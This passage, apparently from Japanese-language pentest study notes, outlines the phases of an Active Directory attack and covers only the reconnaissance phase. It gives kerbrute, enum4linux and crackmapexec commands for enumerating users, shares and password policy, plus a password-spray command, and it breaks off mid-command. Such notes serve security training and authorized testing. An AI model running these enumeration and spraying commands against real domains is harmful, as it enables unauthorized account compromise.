
### Procedure
-----
1. 偵察・情報収集（Reconnaissance）
2. 初期侵入（Inital Access）
3. 認証情報の取得（Credential Access）
4. 横展開（Lateral Movement）
5. 権限昇格（Privilege Escalation）
6. ドメイン支配（Domain Dominance）

<br>

#### 1. 偵察・情報収集（Reconnaissance）
-----
- ユーザ名の列挙
  - 手法：Kerberos Pre-Authentication、LDAL匿名バインド、SMB Null Session
  - ツール：kerbrute、enum4linux、crackmapexec
  - 目的：有効なユーザアカウントのリスト作成
```bash
# Kerberosを使ったユーザ列挙
kerbrute userenum --dc <IP> -d DOMAIN.LOCAL users.txt

# enum4linuxを用いたユーザ列挙
enum4linux -U -S -G -P -o <IP>
# -U：ユーザ一覧取得 / -S：共有フォルダ一覧取得 / -G：グループ一覧取得 / -P：パスワードポリシー取得

# 認証情報を使用したenum4linux
enum4linux -U "user" -p "password" -a <IP>

# crackmapexecを用いた列挙
crackmapexec smb <IP> -u '' -p '' --shares
# --users：ユーザ一覧取得 / --shares：共有フォルダ一覧取得 / --groups：グループ一覧取得 / --local-auth：ローカル管理者権限チェック

# crackmapexecを用いたPWスプレー攻撃
crackmapexec smb <IP> -u users.txt -p 'P@ssw0rd' --continue-on-success
crackmapexec smb <IP> -u 
```
